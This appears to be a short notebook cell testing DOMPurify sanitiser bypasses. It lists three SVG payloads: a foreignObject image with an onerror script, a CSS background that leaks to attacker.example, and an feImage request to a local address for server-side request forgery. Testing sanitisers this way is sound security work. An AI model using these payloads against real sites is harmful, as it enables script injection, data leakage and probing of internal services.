# %%
# DOMPurify bypass test - XSS payloads
# Out:
# <svg xmlns="http://www.w3.org/2000/svg"><foreignObject width="300" height="200"><div xmlns="http://www.w3.org/1999/xhtml"><img src=x onerror="console.log("XSS-FOREIGNOBJECT")"></div></foreignObject><rect width="300" height="200" fill="red"/></svg>
# <svg><svg><style>*{background-image:url(//attacker.example/css-leak)}</style></svg></svg>
# <svg><filter id="x"><feImage href="http://127.0.0.1:8080/ssrf"></feImage></filter><rect filter="url(#x)" width="300" height="200"/></svg>
